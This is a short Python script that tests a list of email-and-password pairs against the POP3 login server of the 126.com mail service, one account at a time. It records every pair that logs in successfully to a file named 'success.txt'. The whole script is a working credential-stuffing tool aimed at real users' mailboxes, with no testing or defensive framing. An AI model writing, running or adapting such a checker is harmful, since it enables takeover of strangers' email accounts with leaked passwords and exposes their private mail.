import poplib
import time
scan = []
with open('126.txt','r',encoding='utf-8') as f :
    for i in f.readlines():
        scan.append(i.strip('\n'))



pop3_server = 'pop3.126.com'
server = poplib.POP3_SSL(pop3_server)

for j in scan:
    server = poplib.POP3_SSL(pop3_server)
    all =j.split('\t')
    email = all[0]
    password = all[1]
    time.sleep(1)

    try:
        server = poplib.POP3_SSL(pop3_server)

        u = server.user(email)

        p = server.pass_(password)

        time.sleep(1)

        if p:
            server = poplib.POP3_SSL(pop3_server)


            print("[+ login success]: %s ： %s" % (email, password))
            server.close()



            with open('success.txt', 'a+', encoding='UTF-8') as w:
                w.write(email + '\t' + password + '\n')

    except Exception as error:

            print( "[-login failed]: %s ： %s" % (email, password),error)
    finally:
        server.close()
